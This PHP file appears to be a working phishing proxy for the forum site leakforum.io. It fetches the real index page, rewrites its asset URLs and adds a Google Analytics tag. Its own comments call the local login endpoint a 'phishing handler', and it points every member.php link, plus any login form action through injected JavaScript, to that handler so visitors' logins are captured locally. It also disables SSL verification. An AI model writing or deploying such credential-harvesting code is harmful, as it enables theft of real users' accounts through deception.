<?php
/**
 * Proxy the LeakForum index while injecting our own minimal header.
 * We fetch https://leakforum.io/index.php, strip its original header/navigation,
 * rewrite relative asset URLs to absolute, then echo it wrapped in a basic
 * container where our (fake) header sits. If remote fetch fails, we fallback
 * to a static local copy (test.html).
 */

function fetchLeakForum(): ?string {
    $ch = curl_init('https://leakforum.io/index.php');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; LeakProxy/1.0)'
    ]);
    $html = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if($code!==200 || !$html){
        return null;
    }
    return $html;
}

function absolutizeUrls(string $html): string {
    // prefix protocol-relative or root-relative assets
    // callback integrated inline below
    $pattern = '/(src|href)=(["\\\'])([^"\'\s>]+)\2/i';
    return preg_replace_callback($pattern,function($m) {
        $pre = $m[1].'='.$m[2];
        $url = $m[3];
        $post= $m[2];
        if(strpos($url,'//')===0){
            $url='https:'.$url;
        } elseif(strpos($url,'/')===0){
            $url='https://leakforum.io'.$url;
        }
        return $pre.$url.$post;
    },$html);
}

function rewriteAuthLinks(string $html): string {
    // point any references to leakforum member.php back to local phishing handler
    $patterns = [
        '#https?://leakforum\.io/member\.php#i', // absolute
        '#/member\.php#i' // root-relative (should not appear after absolutize but keep)
    ];
    foreach($patterns as $p){
        $html = preg_replace($p, '/member.php', $html);
    }
    return $html;
}

$remote = fetchLeakForum();
if($remote){
    $remote = absolutizeUrls($remote);
    $remote = rewriteAuthLinks($remote);
    // Inject Google Analytics tag
    $gtag = <<<'HTML'
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-23FWFL79DW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);} 
  gtag('js', new Date());
  gtag('config', 'G-23FWFL79DW');
</script>
HTML;

    // Place GA snippet right before </head>
    $remote = str_replace('</head>', $gtag.'</head>', $remote);
    // Inject runtime JS to patch any dynamically inserted login forms
    $patch = <<<'JS'
<script>
document.addEventListener('DOMContentLoaded',()=>{
  document.querySelectorAll('form').forEach(f=>{
    const act = f.getAttribute('action')||'';
    if(act.includes('leakforum.io/member.php')){
      f.setAttribute('action','/member.php');
    }
  });
});
</script>
JS;
    $remote = str_replace('</body>',$patch.'</body>',$remote);
    echo $remote;
    exit;
}

// Fallback to old static file if remote unavailable
readfile(__DIR__.'/test.html'); 